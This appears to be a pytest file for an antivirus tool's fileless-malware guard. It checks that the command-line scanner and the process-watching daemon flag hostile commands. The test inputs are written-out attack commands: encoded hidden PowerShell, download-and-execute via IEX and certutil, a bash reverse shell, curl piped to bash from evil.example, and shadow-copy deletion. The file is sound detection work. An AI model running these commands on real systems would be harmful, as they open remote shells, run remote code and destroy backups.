"""Tests for Ember's real-time fileless-malware protection (fileless_guard.py).

Runnable two ways:
    pytest test_fileless_guard.py
    python test_fileless_guard.py        # PASS/FAIL summary

A synthetic process table is injected via fileless_guard._ENUMERATOR so the tests
never read the real process list and stay fast/hermetic. All antivirus state is
redirected to a throwaway dir so nothing touches the real user profile.
"""
import os
import tempfile
import time

os.environ.setdefault("EMBER_SUPPORT_DIR", tempfile.mkdtemp(prefix="ember_fg_test_"))

import antivirus
import fileless_guard as fg


def _reset():
    fg.fileless_guard_stop()
    with fg._LOCK:
        fg._events.clear()
        fg._seen.clear()
        fg._threats_found = 0
        fg._processes_scanned = 0
    fg._ENUMERATOR = None
    fg._SCANNER = None
    # auto-terminate is ON by default now; record (don't kill) the synthetic PIDs so a
    # test process can never SIGKILL a real OS process that shares a fake PID (100/300…).
    fg._killed = []
    fg._TERMINATOR = lambda pid: (fg._killed.append(pid) or True)


# --- the shared behavioral engine (antivirus.scan_command_line) ----------------

def test_encoded_powershell_is_malicious():
    r = antivirus.scan_command_line(
        "powershell.exe -nop -w hidden -enc " + "A" * 60)
    assert r["verdict"] == "malicious", r
    assert "encoded-powershell" in r["categories"], r


def test_download_and_execute_is_malicious():
    r = antivirus.scan_command_line(
        'powershell IEX (New-Object Net.WebClient).DownloadString("http://x/a.ps1")')
    assert r["verdict"] == "malicious", r
    assert "download-exec" in r["categories"], r


def test_reverse_shell_is_malicious():
    r = antivirus.scan_command_line("bash -i >& /dev/tcp/10.0.0.5/4444 0>&1")
    assert r["verdict"] == "malicious" and "reverse-shell" in r["categories"], r


def test_ransomware_shadow_delete_is_malicious():
    r = antivirus.scan_command_line("vssadmin delete shadows /all /quiet")
    assert r["verdict"] == "malicious" and "ransomware" in r["categories"], r


def test_curl_pipe_shell_is_malicious():
    r = antivirus.scan_command_line("curl http://evil.example/x.sh | bash")
    assert r["verdict"] == "malicious", r


def test_benign_commands_are_clean():
    for c in ("ls -la /home/user", "git commit -m 'fix bug'",
              "python3 manage.py runserver", "node server.js"):
        r = antivirus.scan_command_line(c)
        assert r["verdict"] == "clean", (c, r)


# --- one-shot process scan -----------------------------------------------------

def test_scan_processes_flags_threats_and_lineage():
    _reset()
    fake = [
        {"pid": 1, "ppid": 0, "name": "init", "cmdline": "/sbin/init"},
        {"pid": 50, "ppid": 1, "name": "winword.exe", "cmdline": "winword.exe report.docx"},
        {"pid": 100, "ppid": 1, "name": "powershell.exe",
         "cmdline": "powershell -w hidden -enc " + "Z" * 64},        # malicious cmdline
        {"pid": 102, "ppid": 50, "name": "cmd.exe", "cmdline": "cmd.exe /c whoami"},  # office->cmd lineage
        {"pid": 200, "ppid": 1, "name": "bash", "cmdline": "bash -c 'ls'"},           # clean
    ]
    fg._ENUMERATOR = lambda: fake
    r = fg.scan_processes()
    assert r["ok"] and r["scanned"] == 5, r
    verdicts = {f["pid"]: f["verdict"] for f in r["flagged"]}
    assert verdicts.get(100) == "malicious", r
    assert verdicts.get(102) in ("suspicious", "malicious"), r   # lineage flagged
    assert 200 not in verdicts and 1 not in verdicts, r          # benign untouched
    _reset()


def test_scan_processes_handles_enumeration_failure():
    _reset()
    fg._ENUMERATOR = lambda: None
    r = fg.scan_processes()
    assert r["ok"] is False and "error" in r, r
    _reset()


# --- background daemon ---------------------------------------------------------

def test_daemon_initial_sweep_and_lifecycle():
    _reset()
    fake = [
        {"pid": 100, "ppid": 1, "name": "powershell.exe",
         "cmdline": "powershell -enc " + "Q" * 64},
        {"pid": 200, "ppid": 1, "name": "bash", "cmdline": "bash -c 'ls'"},
    ]
    fg._ENUMERATOR = lambda: fake
    start = fg.fileless_guard_start()
    assert start["ok"] and start["watching"], start
    assert start["initial_threats"] >= 1, start
    st = fg.fileless_guard_status()
    assert st["running"] is True and st["threats_found"] >= 1, st
    evs = fg.fileless_guard_events()["events"]
    assert any(e["verdict"] == "malicious" for e in evs), evs
    stop = fg.fileless_guard_stop()
    assert stop["ok"], stop
    assert fg.is_running() is False
    _reset()


def test_daemon_flags_new_process_after_start():
    _reset()
    state = {"procs": [{"pid": 200, "ppid": 1, "name": "bash", "cmdline": "bash -c ls"}]}
    fg._ENUMERATOR = lambda: state["procs"]
    antivirus.set_config(fileless_poll_seconds=0.05)   # the real polling knob
    try:
        s = fg.fileless_guard_start()
        assert s["ok"] and s["initial_threats"] == 0, s
        # A malicious process now appears AFTER the watcher started.
        state["procs"] = state["procs"] + [
            {"pid": 300, "ppid": 1, "name": "powershell.exe",
             "cmdline": "powershell IEX (New-Object Net.WebClient).DownloadString('http://x/a')"}]
        deadline = time.time() + 4.0
        while time.time() < deadline and fg.fileless_guard_status()["threats_found"] == 0:
            time.sleep(0.05)
        assert fg.fileless_guard_status()["threats_found"] >= 1, "new threat not detected"
    finally:
        fg.fileless_guard_stop()
        antivirus.set_config(fileless_poll_seconds=4)
        _reset()


def test_start_is_idempotent():
    _reset()
    fg._ENUMERATOR = lambda: []
    a = fg.fileless_guard_start()
    b = fg.fileless_guard_start()
    assert a["ok"] and b["ok"], (a, b)
    assert "already running" in b.get("message", ""), b
    fg.fileless_guard_stop()
    _reset()


def test_scan_command_tool():
    r = fg.scan_command("certutil -urlcache -split -f http://evil/p.exe p.exe")
    assert r["ok"] and r["verdict"] == "malicious", r


def test_tool_wiring_exports():
    assert set(fg.TOOL_DISPATCH) == {d["name"] for d in fg.TOOL_DECLARATIONS}
    assert "scan_processes" in fg.READONLY_TOOLS
    assert "fileless_guard_start" in fg.INTERACTION_TOOLS


def _run_all() -> bool:
    import types
    funcs = [v for k, v in sorted(globals().items())
             if k.startswith("test_") and isinstance(v, types.FunctionType)]
    passed = 0
    for fn in funcs:
        try:
            fn()
            print(f"PASS  {fn.__name__}")
            passed += 1
        except Exception as e:
            print(f"FAIL  {fn.__name__}: {e}")
    print(f"\n{passed}/{len(funcs)} passed")
    return passed == len(funcs)


if __name__ == "__main__":
    import sys
    sys.exit(0 if _run_all() else 1)
